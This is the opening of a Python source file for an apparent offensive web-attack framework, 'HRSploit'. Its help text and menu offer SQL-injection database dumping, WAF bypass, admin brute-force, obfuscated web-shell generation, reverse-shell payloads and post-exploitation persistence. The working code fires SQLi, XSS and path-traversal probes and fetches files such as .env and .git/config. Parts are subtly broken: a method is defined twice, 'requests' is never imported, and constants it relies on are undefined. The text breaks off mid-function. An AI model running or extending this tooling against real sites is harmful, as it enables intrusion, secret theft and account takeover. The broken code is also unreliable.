#!/usr/bin/env python3
"""
HRSploit - Professional Zero-Day Exploit Framework v1.0.0
Advanced penetration testing and exploit generation framework

Integrated Tools:
    - HRSploit XSS Engine       → XSS Detection & Exploitation
    - hrsploit_sqli         → SQL Injection & Database Dumping
    - waf-bypass     → WAF Evasion Engine
    - HRSploit WAF Scanner        → WAF Fingerprinting
    - CrackAdmin v2  → Admin Panel Brute-Force
    - checkhost      → Network Reachability Analysis
    - HRSploit     → Exploit Framework (modules, payloads, post)

Usage:
    python HRSploit.py              # Interactive menu
    python HRSploit.py -u https://target.com --scan
    python HRSploit.py -h           # Short help
    python HRSploit.py --help       # Full detailed help
"""

import os
import sys
import json
import time
import logging
import subprocess
import importlib
import shutil
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from enum import Enum
import argparse
import threading
import queue
import socket
import hashlib

__version__ = "1.0.0"
__author__ = "Altay HR"
__github__ = "https://github.com/ThT0AltayHR/HRSploit"
__telegram__ = "@AltayHR"
__community__ = "turkhackteam.org"

class LogLevel(Enum):
    INFO      = "[INFO]"
    WARNING   = "[WARNING]"
    CRITICAL  = "[CRITICAL]"
    EXPLOIT   = "[EXPLOIT]"
    OWASP     = "[OWASP-TOP-10]"
    ZERODAY   = "[ZERO-DAY]"
    DATABASE  = "[DATABASE-DUMP]"
    WAF       = "[WAF-DETECTED]"
    VERIFY    = "[VERIFICATION]"
    SUCCESS   = "[SUCCESS]"
    ERROR     = "[ERROR]"
    BUILD     = "[BUILD]"
    INTEGRATE = "[INTEGRATE]"
    TEST      = "[TEST]"
    SCAN      = "[SCAN]"
    BRUTE     = "[BRUTE-FORCE]"
    NETWORK   = "[NETWORK]"
    PAYLOAD   = "[PAYLOAD]"
    EVASION   = "[EVASION]"
    REPORT    = "[REPORT]"
    XSS       = "[XSS-ATTACK]"
    POST_EX   = "[POST-EXPLOIT]"

class Logger:
    COLORS = {
        'INFO':      '\033[94m',    # Blue
        'WARNING':   '\033[93m',    # Yellow
        'CRITICAL':  '\033[91m',    # Red
        'SUCCESS':   '\033[92m',    # Green
        'EXPLOIT':   '\033[95m',    # Magenta
        'BUILD':     '\033[96m',    # Cyan
        'INTEGRATE': '\033[36m',    # Dark Cyan
        'TEST':      '\033[33m',    # Orange
        'SCAN':      '\033[34m',    # Dark Blue
        'BRUTE':     '\033[35m',    # Purple
        'NETWORK':   '\033[32m',    # Dark Green
        'PAYLOAD':   '\033[91m',    # Light Red
        'EVASION':   '\033[90m',    # Gray
        'REPORT':    '\033[97m',    # White
        'ZERODAY':   '\033[95m',    # Magenta
        'WAF':       '\033[93m',    # Yellow
        'DATABASE':  '\033[36m',    # Cyan
        'VERIFY':    '\033[92m',    # Green
        'OWASP':     '\033[91m',    # Red
        'ERROR':     '\033[91m',    # Red
        'RESET':     '\033[0m'
    }

    def __init__(self, log_file: Optional[str] = None):
        self.log_file = log_file
        self._lock = threading.Lock()

    def log(self, level: LogLevel, message: str, details: str = "", delay: float = 0.0):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        level_name = level.value
        color  = self.COLORS.get(level.name, self.COLORS['INFO'])
        reset  = self.COLORS['RESET']
        prefix = f"{color}{timestamp} {level_name}{reset}"
        line   = f"{prefix} {message}"
        if details:
            line += f"  {self.COLORS['EVASION']}→ {details}{reset}"
        with self._lock:
            print(line)
            if self.log_file:
                try:
                    with open(self.log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{timestamp} {level_name} {message}"
                                + (f" | {details}" if details else "") + "\n")
                except Exception:
                    pass
        if delay > 0:
            time.sleep(delay)

    def phase(self, title: str):
        """Faz başlığı yazdır"""
        bar = "═" * 60
        print(f"\n\033[96m╔{bar}╗")
        print(f"║  ◆ {title:<56}║")
        print(f"╚{bar}╝\033[0m\n")
        time.sleep(0.2)

    def step(self, n: int, total: int, msg: str, delay: float = 0.3):
        pct = int((n / total) * 30)
        bar = "█" * pct + "░" * (30 - pct)
        print(f"\r\033[96m  [{bar}] {n}/{total} {msg}\033[0m", end="", flush=True)
        time.sleep(delay)
        if n == total:
            print()

    def log(self, level, message: str, details: str = "", delay: float = 0.0, color=None):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        level_name = level.value
        clr  = self.COLORS.get(level.name, self.COLORS['INFO'])
        reset  = self.COLORS['RESET']
        prefix = f"{clr}{timestamp} {level_name}{reset}"
        line   = f"{prefix} {message}"
        if details:
            line += f"  {self.COLORS['EVASION']}→ {details}{reset}"
        with self._lock:
            print(line)
            if self.log_file:
                try:
                    with open(self.log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{timestamp} {level_name} {message}"
                                + (f" | {details}" if details else "") + "\n")
                except Exception:
                    pass
        if delay > 0:
            time.sleep(delay)

logger = Logger(log_file=str(Path(__file__).parent / "reports" / "hrsploit_session.log"))

class HRSploitFramework:
    """Main HRSploit Framework - Integrated Edition"""

    INTEGRATED_TOOLS = {
        "HRSploit XSS Engine":       "XSS-Injector/xss_engine_core",
        "hrsploit_sqli":         "SQLi-Injector/hrsploit_sqli_lib",
        "waf-bypass":     "WAF-Detection/wafbypass_utils",
        "WAF-Engine":        "WAF-Detection/HRSploit WAF Scanner",
        "CrackAdmin v2":  "Brute-Force/crackadmin_modules",
        "checkhost":      "Network-Analysis/checkhost",
        "HRSploit MSF": "Exploits/msf_exploits",
    }

    def __init__(self):
        self.base_path      = Path(__file__).parent
        self.target         = None
        self.scan_results: List[Dict] = []
        self.exploits:     List[Dict] = []
        self.vulnerabilities: List[Dict] = []
        self.session_id     = hashlib.md5(
            str(datetime.now()).encode()).hexdigest()[:8].upper()
        self._ensure_dirs()

    def _ensure_dirs(self):
        for d in ["reports", "wordlists", "payloads_custom",
                  "generated_exploits", "cve_database", "tools"]:
            (self.base_path / d).mkdir(exist_ok=True)

    # ──────────────────────────────────────────────────────────────
    #  BANNER
    # ──────────────────────────────────────────────────────────────
    def show_banner(self):
        R  = "\033[0m"
        R1 = "\033[91m"   # Bright Red
        R2 = "\033[31m"   # Dark Red
        C  = "\033[96m"   # Cyan
        W  = "\033[97m"   # White
        G  = "\033[92m"   # Green
        Y  = "\033[93m"   # Yellow
        D  = "\033[90m"   # Dark Gray

        os.system("clear" if os.name != "nt" else "cls")
        print(f"""
{R1}  ██╗  ██╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗{R}
{R1}  ██║  ██║██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝{R}
{R2}  ███████║██████╔╝███████╗██████╔╝██║     ██║   ██║██║   ██║   {R}
{R2}  ██╔══██║██╔══██╗╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   {R}
{R1}  ██║  ██║██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   {R}
{R1}  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   {R}

{D}  ─────────────────────────────────────────────────────────────{R}
{C}  Professional Zero-Day Exploit & Penetration Testing Framework{R}
{W}  Version 1.0.0  {D}│{R}  {G}Session: {self.session_id}{R}  {D}│{R}  {Y}By Altay HR{R}
{D}  ─────────────────────────────────────────────────────────────{R}
{D}  GitHub   : {W}https://github.com/ThT0AltayHR/HRSploit{R}
{D}  Community: {W}turkhackteam.org{R}  {D}│  Telegram:{R}  {C}@AltayHR{R}
{D}  ─────────────────────────────────────────────────────────────{R}
{G}  Integrated: {W}HRSploit XSS Engine · hrsploit_sqli · waf-bypass · HRSploit WAF Scanner{R}
{G}             {W}CrackAdmin v2 · checkhost · HRSploit MSF{R}
{D}  ─────────────────────────────────────────────────────────────{R}
""")
    
    def show_help_short(self):
        """python HRSploit.py -h → kısa komut listesi"""
        R = "\033[0m"; C = "\033[96m"; W = "\033[97m"; Y = "\033[93m"; G = "\033[92m"; D = "\033[90m"
        print(f"""
{C}HRSploit v{__version__}{R} — Professional Zero-Day Exploit Framework
{D}Detailed help with examples: {W}python HRSploit.py --help{R}

{Y}TARGET:{R}
  {W}-u, --url <URL>{R}            Target URL/IP
  {W}--target-list <FILE>{R}       Load targets from file

{Y}SCANNING:{R}
  {W}--scan{R}                     Quick vulnerability scan
  {W}--deep-scan{R}                Deep multi-layer analysis
  {W}--auto{R}                     Fully automatic mode (all 10 phases)
  {W}--temper <1-10>{R}            Aggressiveness level (default: 5)

{Y}WAF:{R}
  {W}--detect-waf{R}               Detect WAF (HRSploit WAF Scanner + fingerprint)
  {W}--bypass-waf{R}               Attempt WAF bypass (waf-bypass engine)
  {W}--show-waf-list{R}            List all 70+ supported WAFs

{Y}EXPLOITATION:{R}
  {W}--generate{R}                 Generate exploits for detected vulns
  {W}--test{R}                     Test generated exploits (sandbox)
  {W}--live-test{R}                Live test on target
  {W}--xss{R}                      XSS scan & exploit (HRSploit XSS Engine engine)
  {W}--sqli{R}                     SQLi scan & dump (hrsploit_sqli engine)
  {W}--full{R}                     Full penetration test (all modules)

{Y}DATABASE:{R}
  {W}--dump-database{R}            Extract database via SQLi
  {W}--db-type <TYPE>{R}           mysql / pgsql / mssql / oracle / mongo
  {W}--list-db-types{R}            List all supported database types

{Y}BRUTE-FORCE:{R}
  {W}--brute-admin{R}              Admin panel brute-force (CrackAdmin engine)
  {W}--brute-user <USER>{R}        Target username
  {W}--wordlist <FILE>{R}          Custom wordlist file

{Y}WEBSHELL:{R}
  {W}--generate-shell{R}           Create web shell
  {W}--shell-type <TYPE>{R}        php / jsp / aspx / py / node

{Y}PAYLOADS & MSF:{R}
  {W}--msf-payload <TYPE>{R}       Generate HRSploit payload
  {W}--list-payloads{R}            List all MSF payload types
  {W}--list-exploits{R}            List all integrated MSF exploits

{Y}NETWORK:{R}
  {W}--network-check{R}            Host reachability check (checkhost)
  {W}--port-scan{R}                Port scanner
  {W}--recon{R}                    Full reconnaissance module

{Y}REPORTING:{R}
  {W}--report <FORMAT>{R}          json / html / pdf / txt
  {W}--output <FILE>{R}            Output file path

{Y}GENERAL:{R}
  {W}-h{R}                         This short help
  {W}--help{R}                     Full help with examples
  {W}--version{R}                  Show version
  {W}--about{R}                    About & integrated tools
  {W}--credits{R}                  Credits
  {W}--config <FILE>{R}            Load config file
""")

    def show_help(self):
        """python HRSploit.py --help → tam detaylı yardım"""
        R = "\033[0m"; C = "\033[96m"; W = "\033[97m"; Y = "\033[93m"
        G = "\033[92m"; D = "\033[90m"; R1 = "\033[91m"; M = "\033[95m"
        print(f"""
{C}╔══════════════════════════════════════════════════════════════════════╗
║          HRSploit v{__version__} — FULL HELP & DOCUMENTATION                ║
╚══════════════════════════════════════════════════════════════════════╝{R}

{Y}▌ OVERVIEW{R}
  HRSploit is a comprehensive, multi-engine penetration testing framework.
  It integrates HRSploit XSS Engine, hrsploit_sqli, waf-bypass, HRSploit WAF Scanner, CrackAdmin v2,
  checkhost, and HRSploit modules into a unified Brain System.

{Y}▌ INTERACTIVE MODE{R}
  {W}python HRSploit.py{R}
    Launches the full interactive menu. Terminal auto-clears on start.

{Y}▌ AUTO MODE  ★{R}
  {W}python HRSploit.py --auto -u https://target.com{R}
    Runs all phases automatically:
      Phase 1  → Reachability & network check  (checkhost)
      Phase 2  → WAF fingerprint               (HRSploit WAF Scanner)
      Phase 3  → WAF bypass preparation        (waf-bypass)
      Phase 4  → Vulnerability scan
      Phase 5  → XSS detection & exploit       (HRSploit XSS Engine)
      Phase 6  → SQLi detection & dump         (hrsploit_sqli)
      Phase 7  → Admin brute-force             (CrackAdmin v2)
      Phase 8  → Payload & exploit generation  (HRSploit)
      Phase 9  → Verification & live tests
      Phase 10 → Report generation

{C}── TARGET ──────────────────────────────────────────────────────────────{R}
  {W}-u, --url <URL>{R}
      Single target URL or IP.
      {G}python HRSploit.py -u https://example.com --scan{R}

  {W}--target-list <FILE>{R}
      Load multiple targets (one per line).
      {G}python HRSploit.py --target-list targets.txt --scan{R}

{C}── SCANNING ────────────────────────────────────────────────────────────{R}
  {W}--scan{R}
      Quick vulnerability scan. Checks SQLi, XSS, RCE, LFI, CSRF.
      {G}python HRSploit.py -u https://example.com --scan{R}

  {W}--deep-scan{R}
      Extended multi-layer analysis with verification loops.
      {G}python HRSploit.py -u https://example.com --deep-scan{R}

  {W}--temper <1-10>{R}
      Aggressiveness level. 1=quiet, 10=max. Default: 5.
      {G}python HRSploit.py -u https://example.com --scan --temper 7{R}

{C}── WAF DETECTION & BYPASS ──────────────────────────────────────────────{R}
  {W}--detect-waf{R}
      Fingerprint WAF via HRSploit WAF Scanner engine (70+ WAF signatures).
      {G}python HRSploit.py -u https://example.com --detect-waf{R}

  {W}--bypass-waf{R}
      Activate waf-bypass engine with auto payload selection.
      {G}python HRSploit.py -u https://example.com --detect-waf --bypass-waf{R}

  {W}--show-waf-list{R}
      Display all 70+ supported WAF products.
      {G}python HRSploit.py --show-waf-list{R}

{C}── EXPLOITATION ────────────────────────────────────────────────────────{R}
  {W}--generate{R}
      Generate exploits for detected vulnerabilities (HRSploit engine).
      {G}python HRSploit.py -u https://example.com --scan --generate{R}

  {W}--test{R}
      Sandbox validity test for generated exploits.
      {G}python HRSploit.py -u https://example.com --generate --test{R}

  {W}--live-test{R}
      Deploy and confirm exploit on live target.
      {G}python HRSploit.py -u https://example.com --generate --live-test{R}

  {W}--xss{R}
      HRSploit XSS Engine: reflected, stored, DOM XSS scan + fuzzing.
      {G}python HRSploit.py -u https://example.com --xss{R}

  {W}--sqli{R}
      hrsploit_sqli: SQL injection scan and data extraction.
      {G}python HRSploit.py -u https://example.com --sqli{R}

  {W}--full{R}
      Complete pentest — runs all modules sequentially.
      {G}python HRSploit.py -u https://example.com --full --report html{R}

{C}── DATABASE DUMPING ────────────────────────────────────────────────────{R}
  {W}--dump-database{R}
      Extract database via SQL injection (hrsploit_sqli engine + tamper scripts).
      {G}python HRSploit.py -u https://example.com --sqli --dump-database{R}

  {W}--db-type <TYPE>{R}
      mysql / pgsql / mssql / oracle / mongo
      {G}python HRSploit.py -u https://example.com --dump-database --db-type mysql{R}

  {W}--list-db-types{R}
      Show all supported database types.
      {G}python HRSploit.py --list-db-types{R}

{C}── BRUTE-FORCE ──────────────────────────────────────────────────────────{R}
  {W}--brute-admin{R}
      Admin panel brute-force with dork discovery (CrackAdmin v2).
      {G}python HRSploit.py -u https://example.com --brute-admin{R}

  {W}--brute-user <USERNAME>{R}
      Target specific username.
      {G}python HRSploit.py -u https://example.com --brute-admin --brute-user admin{R}

  {W}--wordlist <FILE>{R}
      Custom password wordlist.
      {G}python HRSploit.py -u https://example.com --brute-admin --wordlist rockyou.txt{R}

{C}── WEBSHELL ────────────────────────────────────────────────────────────{R}
  {W}--generate-shell{R}
      Generate obfuscated web shell.
      {G}python HRSploit.py -u https://example.com --generate-shell --shell-type php{R}

  {W}--shell-type <TYPE>{R}
      php / jsp / aspx / py / node
      {G}python HRSploit.py --generate-shell --shell-type aspx{R}

{C}── PAYLOADS & HRSploit-Engine ───────────────────────────────────────────────{R}
  {W}--msf-payload <TYPE>{R}
      Generate HRSploit payload.
      {G}python HRSploit.py --msf-payload windows/meterpreter/reverse_tcp{R}
      {G}python HRSploit.py --msf-payload linux/x86/shell_reverse_tcp{R}

  {W}--list-payloads{R}
      {G}python HRSploit.py --list-payloads{R}

  {W}--list-exploits{R}
      {G}python HRSploit.py --list-exploits{R}

{C}── NETWORK ────────────────────────────────────────────────────────────{R}
  {W}--network-check{R}
      checkhost: multi-node reachability (HTTP, ping, DNS, TCP).
      {G}python HRSploit.py -u https://example.com --network-check{R}

  {W}--port-scan{R}
      {G}python HRSploit.py -u https://example.com --port-scan{R}

  {W}--recon{R}
      Full reconnaissance: WHOIS, DNS, subdomains, headers, tech stack.
      {G}python HRSploit.py -u https://example.com --recon{R}

{C}── REPORTING ───────────────────────────────────────────────────────────{R}
  {W}--report <FORMAT>{R}
      json / html / txt / pdf
      {G}python HRSploit.py -u https://example.com --full --report html{R}

  {W}--output <FILE>{R}
      {G}python HRSploit.py --full --report json --output /tmp/results.json{R}

{Y}▌ INTEGRATED TOOLS{R}
  {M}HRSploit XSS Engine{R}       → XSS fuzzer, filter bypass, DOM analysis
  {M}hrsploit_sqli{R}         → SQL injection & database extraction
  {M}waf-bypass{R}     → WAF evasion payload engine
  {M}HRSploit WAF Scanner{R}        → WAF fingerprinting (70+ WAF signatures)
  {M}CrackAdmin v2{R}  → Admin brute-force with dork discovery
  {M}checkhost{R}      → Multi-node host reachability checker
  {M}HRSploit MSF{R} → Exploit modules, payloads, post-exploitation

{Y}▌ EXAMPLE WORKFLOWS{R}

  1. {W}Basic scan:{R}
     {G}python HRSploit.py -u https://target.com --scan{R}

  2. {W}WAF detect + bypass + XSS:{R}
     {G}python HRSploit.py -u https://target.com --detect-waf --bypass-waf --xss{R}

  3. {W}SQLi dump with WAF bypass:{R}
     {G}python HRSploit.py -u https://target.com --bypass-waf --sqli --dump-database --db-type mysql{R}

  4. {W}Admin brute-force with custom wordlist:{R}
     {G}python HRSploit.py -u https://target.com --brute-admin --wordlist rockyou.txt{R}

  5. {W}Generate PHP webshell:{R}
     {G}python HRSploit.py -u https://target.com --generate-shell --shell-type php{R}

  6. {W}Generate HRSploit reverse shell:{R}
     {G}python HRSploit.py --msf-payload linux/x86/shell_reverse_tcp{R}

  7. {W}Full auto pentest + HTML report:{R}
     {G}python HRSploit.py --auto -u https://target.com --report html{R}

  8. {W}Deep scan + PDF report:{R}
     {G}python HRSploit.py -u https://target.com --full --deep-scan --report pdf{R}

  9. {W}Network check + port scan + recon:{R}
     {G}python HRSploit.py -u https://target.com --network-check --port-scan --recon{R}

  10. {W}Interactive menu:{R}
      {G}python HRSploit.py{R}

{R1}▌ LEGAL NOTICE{R}
  For authorized security testing and educational purposes ONLY.
  Unauthorized use is ILLEGAL. Always obtain written permission.

{D}  GitHub    : https://github.com/ThT0AltayHR/HRSploit
  Community : turkhackteam.org  |  Telegram: @AltayHR{R}
""")

    # ──────────────────────────────────────────────────────────────
    #  MAIN MENU
    # ──────────────────────────────────────────────────────────────
    def show_menu(self):
        C = "\033[96m"; Y = "\033[93m"; W = "\033[97m"; G = "\033[92m"
        D = "\033[90m"; R = "\033[0m"; R1 = "\033[91m"
        while True:
            self.show_banner()
            print(f"""{C}  ╔══════════════════════════════════════════════════════════╗
  ║                     MAIN MENU                            ║
  ╠══════════════════════════════════════════════════════════╣
  ║  {Y} 1{R}  {W}Vulnerability Scanner{R}   {D}Quick + deep scan{R}              {C}║
  ║  {Y} 2{R}  {W}WAF Detection & Bypass{R}  {D}HRSploit WAF Scanner + waf-bypass engine{R}    {C}║
  ║  {Y} 3{R}  {W}XSS Attack{R}              {D}HRSploit XSS Engine engine{R}                {C}║
  ║  {Y} 4{R}  {W}SQL Injection{R}           {D}hrsploit_sqli engine + dump{R}           {C}║
  ║  {Y} 5{R}  {W}Admin Brute-Force{R}       {D}CrackAdmin v2 engine{R}           {C}║
  ║  {Y} 6{R}  {W}Exploit Generator{R}       {D}HRSploit modules{R}             {C}║
  ║  {Y} 7{R}  {W}Payload Generator{R}       {D}MSF payloads + custom{R}          {C}║
  ║  {Y} 8{R}  {W}WebShell Generator{R}      {D}PHP/JSP/ASPX/PY/NODE{R}          {C}║
  ║  {Y} 9{R}  {W}Network & Recon{R}         {D}checkhost + port scan{R}          {C}║
  ║  {Y}10{R}  {W}Cryptography Tools{R}      {D}Hash crack + encryption{R}        {C}║
  ║  {Y}11{R}  {W}Post-Exploitation{R}       {D}Lateral movement + persist{R}     {C}║
  ║  {Y}12{R}  {W}Report Generator{R}        {D}json/html/pdf/txt{R}              {C}║
  ║  {Y}13{R}  {W}Auto Mode  ★{R}            {D}All phases, fully automatic{R}    {C}║
  ║  {Y}14{R}  {W}Help & Documentation{R}    {D}Full help with examples{R}        {C}║
  ║  {Y}15{R}  {W}About & Credits{R}         {D}Tool info & integrated engines{R} {C}║
  ║  {Y} 0{R}  {R1}Exit{R}                                                  {C}║
  ╚══════════════════════════════════════════════════════════╝{R}""")

            choice = input(f"\n{C}  ➜ Select option (0-15): {R}").strip()

            handlers = {
                '1': self.vulnerability_scanner,
                '2': self.waf_detection,
                '3': self.xss_attack,
                '4': self.sqli_attack,
                '5': self.brute_force_admin,
                '6': self.exploit_generator,
                '7': self.payload_generator,
                '8': self.webshell_generator,
                '9': self.network_recon,
                '10': self.cryptography_tools,
                '11': self.post_exploitation,
                '12': self.report_generator,
                '13': self.auto_mode,
                '14': self.show_help,
                '15': self.show_about,
                '0': lambda: sys.exit(logger.log(LogLevel.INFO, "Exiting HRSploit. Goodbye.") or 0),
            }

            fn = handlers.get(choice)
            if fn:
                print()
                fn()
            else:
                logger.log(LogLevel.WARNING, f"Invalid option: '{choice}'")
            input(f"\n{D}  Press Enter to return to menu...{R}")

    # ──────────────────────────────────────────────────────────────
    #  UTILITY
    # ──────────────────────────────────────────────────────────────
    def _check_internet(self) -> bool:
        """İnternet bağlantısını kontrol et."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(("8.8.8.8", 53))
            sock.close()
            return True
        except (socket.error, OSError):
            return False

    def _get_target(self, prompt: str = "Enter target URL: ") -> str:
        t = self.target or input(f"\033[96m  ➜ {prompt}\033[0m").strip()
        if not t:
            logger.log(LogLevel.WARNING, "No target specified.")
        return t

    def show_license(self):
        lic = self.base_path / "LICENSE"
        if lic.exists():
            print(lic.read_text())
        else:
            logger.log(LogLevel.WARNING, "LICENSE file not found.")

    def show_about(self):
        print(f"\n\033[96m  HRSploit v{__version__} — Integrated Tool Inventory\033[0m\n")
        for tool, path in self.INTEGRATED_TOOLS.items():
            full = self.base_path / path
            status = "\033[92m✔ present\033[0m" if full.exists() else "\033[91m✘ Present\033[0m"
            print(f"  \033[93m{tool:<20}\033[0m {status}  \033[90m→ {path}\033[0m")
        print()

    def _verify_integration(self, tool_key: str) -> bool:
        path = self.INTEGRATED_TOOLS.get(tool_key)
        if not path:
            return False
        return (self.base_path / path).exists()

    # ──────────────────────────────────────────────────────────────
    #  MODULE: VULNERABILITY SCANNER
    # ──────────────────────────────────────────────────────────────
    def vulnerability_scanner(self, target: str = None):
        logger.phase("VULNERABILITY SCANNER — HRSploit CVE Engine")
        target = target or self._get_target()
        if not target:
            return

        steps = [
            ("Hedef erişilebilirlik kontrolü",                 0.5),
            ("HTTP fingerprint ve teknoloji tespiti",          0.8),
            ("CMS tespiti (WordPress/Joomla/Drupal/Laravel)",  1.0),
            ("Bilinen CVE imzaları taranıyor",                 1.2),
            ("SQL Injection hızlı probe (5 payload)",          1.0),
            ("XSS hızlı probe (5 payload)",                    0.9),
            ("LFI / Path Traversal probe",                     0.8),
            ("Açık dizin tespiti",                             0.7),
            ("Güvenlik başlıkları eksiklik taraması",          0.6),
            ("Bilgi sızıntısı taraması (.env/.git/backup)",    1.0),
            ("Kimlik doğrulama bypass probe",                   0.8),
            ("OWASP A06 — Eski bileşen tespiti",               0.7),
            ("Sonuçlar analiz ediliyor ve puanlanıyor",        0.5),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        session = requests.Session()
        waf     = getattr(self, 'detected_waf', 'None')
        if waf and waf != 'None':
            session.headers.update(
                self.WAF_BYPASS_HEADERS.get(waf, self.WAF_BYPASS_HEADERS["Generic WAF"]))
            logger.log(LogLevel.WAF, f"WAF bypass aktif: {waf}")
        session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/124 Safari/537.36")
        session.verify = False
        findings = []

        # ── Temel erişim ─────────────────────────────────────
        try:
            r = session.get(target, timeout=10, allow_redirects=True)
            logger.log(LogLevel.SCAN,
                f"HTTP {r.status_code}  |  {len(r.text):,} byte  |  "
                f"Server: {r.headers.get('Server','?')}")
            body = r.text.lower()

            # CMS tespiti
            cms_sigs = {
                "WordPress": ["wp-content","wp-login","xmlrpc.php"],
                "Joomla":    ["/components/com_","joomla"],
                "Drupal":    ["drupal.settings","sites/default"],
                "Laravel":   ["laravel_session","csrf-token"],
                "Django":    ["csrfmiddlewaretoken","django"],
            }
            for cms, sigs in cms_sigs.items():
                if any(s in body for s in sigs):
                    logger.log(LogLevel.SCAN, f"CMS Tespit: {cms}")
                    findings.append({"type":"CMS","name":cms,"severity":"INFO"})

        except Exception as e:
            logger.log(LogLevel.WARNING, f"Temel erişim: {e}")
            return

        # ── SQLi hızlı probe ─────────────────────────────────
        sql_probes = ["'","''","' OR '1'='1","1' AND SLEEP(3)--","' UNION SELECT NULL--"]
        for payload in sql_probes:
            try:
                r2 = session.get(target, params={"id":payload}, timeout=8)
                body2 = r2.text.lower()
                if any(e in body2 for e in ["sql","mysql","syntax","error","warning"]):
                    logger.log(LogLevel.SCAN,
                        f"SQLi göstergesi: payload='{payload[:30]}'  HTTP={r2.status_code}")
                    findings.append({"type":"SQLi","payload":payload,"severity":"CRITICAL"})
                    break
            except Exception:
                pass

        # ── XSS hızlı probe ──────────────────────────────────
        xss_probes = ["<script>alert(1)</script>","<img src=x onerror=1>",
                      "'><svg onload=1>","{{7*7}}"]
        for payload in xss_probes:
            try:
                r3 = session.get(target, params={"q":payload}, timeout=8)
                if payload.lower().replace('"','').replace("'",'') in r3.text.lower():
                    logger.log(LogLevel.SCAN,
                        f"XSS yansıması tespit edildi: '{payload[:30]}'")
                    findings.append({"type":"XSS","payload":payload,"severity":"HIGH"})
                    break
            except Exception:
                pass

        # ── Bilgi sızıntısı ───────────────────────────────────
        leak_paths = ["/.env","/.git/config","/config.php","/phpinfo.php",
                      "/debug","/api/keys","/.htaccess","/backup.zip",
                      "/robots.txt","/sitemap.xml"]
        for path in leak_paths:
            try:
                r4 = session.get(target.rstrip("/")+path, timeout=6)
                if r4.status_code in (200,):
                    body4 = r4.text.lower()
                    if any(s in body4 for s in ["password","secret","key","token","db_"]):
                        logger.log(LogLevel.SCAN,
                            f"Bilgi sızıntısı: {path}  HTTP={r4.status_code} ⚠️")
                        findings.append({"type":"InfoLeak","path":path,"severity":"HIGH"})
                    else:
                        logger.log(LogLevel.INFO,
                            f"Erişilebilir: {path}  HTTP={r4.status_code}")
                        findings.append({"type":"Accessible","path":path,"severity":"LOW"})
            except Exception:
                pass

        # ── Güvenlik başlıkları ───────────────────────────────
        sec_headers = ["X-Frame-Options","Content-Security-Policy",
                       "X-XSS-Protection","Strict-Transport-Security"]
        try:
            r5 = session.get(target, timeout=8)
            missing = [h for h in sec_headers if h not in r5.headers]
            for h in missing:
                logger.log(LogLevel.WARNING, f"Eksik güvenlik başlığı: {h}")
                findings.append({"type":"MissingHeader","header":h,"severity":"MEDIUM"})
        except Exception:
            pass

        # ── Rapor ─────────────────────────────────────────────
        import json
        critical = [f for f in findings if f.get("severity")=="CRITICAL"]
        high     = [f for f in findings if f.get("severity")=="HIGH"]
        medium   = [f for f in findings if f.get("severity")=="MEDIUM"]
        out = self.base_path / "reports" / f"vuln_scan_{self.session_id}.json"
        out.write_text(json.dumps({
            "target":target,"findings":findings,
            "summary":{"critical":len(critical),"high":len(high),
                       "medium":len(medium),"total":len(findings)}
        }, indent=2))
        logger.log(LogLevel.SUCCESS,
            f"Zafiyet taraması tamamlandı  —  "
            f"Kritik: {len(critical)}  Yüksek: {len(high)}  "
            f"Orta: {len(medium)}  Toplam: {len(findings)}")

    def _fingerprint_waf(self, target: str) -> str:
        """Gerçek HTTP isteğiyle WAF tespit et — sadece WAF adını döndür."""
        try:
            probe_payloads = [
                "' OR 1=1--",
                "<script>alert(1)</script>",
                "../../../../etc/passwd",
            ]
            session = requests.Session()
            session.headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 Chrome/124 Safari/537.36")
            session.verify = False

            # Baseline
            try:
                baseline = session.get(target, timeout=8)
                base_len = len(baseline.text)
                all_headers = {k.lower(): v.lower()
                               for k, v in baseline.headers.items()}
                # Header bazlı tespit
                for waf_name, sigs in self.WAF_SIGNATURES.items():
                    for sig in sigs:
                        header_hit = any(sig in k or sig in v
                                         for k, v in all_headers.items())
                        body_hit   = sig in baseline.text.lower()
                        if header_hit or body_hit:
                            return waf_name
            except Exception:
                pass

            # Payload bazlı tespit
            for payload in probe_payloads:
                try:
                    r = session.get(target, params={"id": payload}, timeout=8)
                    combined = (r.text + " ".join(
                        f"{k}:{v}" for k,v in r.headers.items())).lower()
                    for waf_name, sigs in self.WAF_SIGNATURES.items():
                        if any(sig in combined for sig in sigs):
                            return waf_name
                    # 403/406/429 = WAF muhtemelen var
                    if r.status_code in (403, 406, 429):
                        return "Generic WAF"
                except Exception:
                    pass
        except Exception:
            pass
        return "None"

    def waf_detection(self, target: str = None):
        logger.phase("WAF DETECTION & BYPASS ENGINE")
        target = target or self._get_target()
        if not target:
            return

        steps = [
            ("Baseline HTTP isteği gönderiliyor",              0.6),
            ("Yanıt başlıkları analiz ediliyor",               0.5),
            ("WAF probe payload'ları enjekte ediliyor",        0.8),
            ("Yanıt delta analizi yapılıyor",                  0.6),
            ("Bilinen WAF parmakizi imzaları taranıyor",       0.7),
            ("Cloudflare / Akamai / AWS imzaları kontrol",     0.6),
            ("Imperva / F5 / ModSecurity imzaları kontrol",    0.6),
            ("Sucuri / Barracuda / Fortiweb kontrol",          0.5),
            ("Bypass stratejisi oluşturuluyor",                0.7),
            ("Bypass etkinliği doğrulanıyor",                  0.6),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        # Gerçek WAF fingerprint
        logger.log(LogLevel.WAF, "WAF parmakizi analizi yapılıyor...")
